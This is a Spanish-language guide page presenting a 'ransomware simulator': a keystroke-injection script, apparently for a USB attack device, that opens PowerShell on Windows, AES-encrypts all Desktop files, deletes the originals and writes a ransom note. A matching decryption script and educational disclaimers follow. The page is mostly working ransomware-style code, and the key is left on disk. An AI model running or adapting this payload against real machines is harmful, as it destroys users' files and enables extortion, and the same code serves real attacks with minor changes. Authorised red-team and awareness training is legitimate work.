
# Simulación de Ransomware

{% hint style="danger" %}
Este script y sus instrucciones están diseñados para fines educativos y para realizar pruebas en entornos con permiso explícito. El uso no autorizado de estos scripts es ilegal y puede tener consecuencias graves.
{% endhint %}

## <mark style="color:orange;">**Simulador de Ransomware para Windows**</mark>

Este script abrirá PowerShell y ejecutará automáticamente los comandos para cifrar archivos en archivos Windows:

{% code title="RansomWin.txt" %}

```plaintext
REM Simulador de Ransomware para Windows
REM Solo para fines educativos en entornos controlados.

DELAY 500
REM Abrir PowerShell
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000

REM Ruta de los directorios y configuración
STRING $TargetPath = "$env:USERPROFILE\Desktop"
ENTER
STRING $KeyPath = "$env:USERPROFILE\Desktop\aes.key"
ENTER
STRING $EncryptedPath = "$env:USERPROFILE\Desktop\Encrypted"
ENTER
STRING $RansomNote = "$TargetPath\README.txt"
ENTER

REM Crear directorios necesarios
STRING New-Item -ItemType Directory -Force -Path $EncryptedPath
ENTER

REM Generar clave AES
STRING $AESKey = New-Object Byte[] 32; [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($AESKey); [System.IO.File]::WriteAllBytes($KeyPath, $AESKey)
ENTER

REM Función para cifrar archivos
STRING Function Encrypt-Files {
ENTER
STRING Param ([string]$InputFile)
ENTER
STRING $IV = New-Object Byte[] 16; [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($IV)
ENTER
STRING $AES = New-Object Security.Cryptography.AesManaged
ENTER
STRING $AES.Key = [System.IO.File]::ReadAllBytes($KeyPath); $AES.IV = $IV
ENTER
STRING $Encryptor = $AES.CreateEncryptor()
ENTER
STRING $InputStream = [System.IO.File]::OpenRead($InputFile)
ENTER
STRING $OutputStream = [System.IO.File]::OpenWrite("$EncryptedPath\$([System.IO.Path]::GetFileName($InputFile)).enc")
ENTER
STRING $OutputStream.Write($IV, 0, $IV.Length)
ENTER
STRING $CryptoStream = New-Object Security.Cryptography.CryptoStream $OutputStream, $Encryptor, "Write"
ENTER
STRING $InputStream.CopyTo($CryptoStream)
ENTER
STRING $CryptoStream.Close(); $InputStream.Close(); $OutputStream.Close()
ENTER
STRING Remove-Item $InputFile
ENTER
STRING }
ENTER

REM Cifrar archivos en el escritorio
STRING Get-ChildItem -Path $TargetPath -File | ForEach-Object { Encrypt-Files $_.FullName }
ENTER

REM Crear nota de rescate
STRING $RansomMessage = @"
ENTER
STRING ¡Tus archivos han sido cifrados!
ENTER
STRING Para recuperar tus archivos, necesitas la clave AES guardada en el sistema.
ENTER
STRING Clave de recuperación: $KeyPath
ENTER
STRING "@
ENTER
STRING Set-Content -Path $RansomNote -Value $RansomMessage
ENTER

REM Mensaje final
STRING Write-Host "Simulación completada. Archivos cifrados y nota de rescate creada en: $TargetPath"
ENTER
```

{% endcode %}

***

## <mark style="color:orange;">**Cómo Funciona**</mark>

1. **Abre PowerShell**:
   * Usa `GUI r` para abrir el cuadro de "Ejecutar" y luego escribe `powershell` para abrir la terminal.
2. **Configura Rutas**:
   * Define las rutas para los archivos de destino, clave AES, y la carpeta donde se almacenarán los archivos cifrados.
3. **Cifra Archivos**:
   * Cifra los archivos ubicados en el escritorio y los mueve a la carpeta `Encrypted`.
4. **Crea Nota de Rescate**:
   * Genera un archivo `README.txt` que informa al usuario cómo recuperar los archivos.
5. **Simula el Comportamiento**:
   * El script solo cifra archivos en el escritorio y no daña el sistema. La clave AES se guarda para facilitar la recuperación.

***

## <mark style="color:orange;">**Descifrar Archivos**</mark>

Usa el siguiente comando en PowerShell para descifrar los archivos:

{% code title="decrypt.ps1" %}

```powershell
# Función para descifrar archivos
Function Decrypt-Files {
    Param ([string]$InputFile)
    $AESKey = [System.IO.File]::ReadAllBytes("$env:USERPROFILE\Desktop\aes.key")
    $InputStream = [System.IO.File]::OpenRead($InputFile)
    $IV = New-Object Byte[] 16; $InputStream.Read($IV, 0, $IV.Length) | Out-Null
    $AES = New-Object Security.Cryptography.AesManaged
    $AES.Key = $AESKey; $AES.IV = $IV
    $Decryptor = $AES.CreateDecryptor()
    $CryptoStream = New-Object Security.Cryptography.CryptoStream $InputStream, $Decryptor, "Read"
    $OutputFile = "$env:USERPROFILE\Desktop\Decrypted\$([System.IO.Path]::GetFileNameWithoutExtension($InputFile))"
    $OutputStream = [System.IO.File]::OpenWrite($OutputFile)
    $CryptoStream.CopyTo($OutputStream)
    $CryptoStream.Close(); $InputStream.Close(); $OutputStream.Close()
    Remove-Item $InputFile
}

# Descifrar archivos
New-Item -ItemType Directory -Force -Path "$env:USERPROFILE\Desktop\Decrypted"
Get-ChildItem -Path "$env:USERPROFILE\Desktop\Encrypted" -File | ForEach-Object { Decrypt-Files $_.FullName }
```

{% endcode %}

***

## <mark style="color:orange;">**Advertencia**</mark>

* **Uso responsable**: Este script es para demostraciones educativas en entornos controlados.
* **No dañino**: No elimina la clave ni impide la recuperación de los archivos.
* **Precaución**: No lo uses sin el consentimiento explícito del usuario.
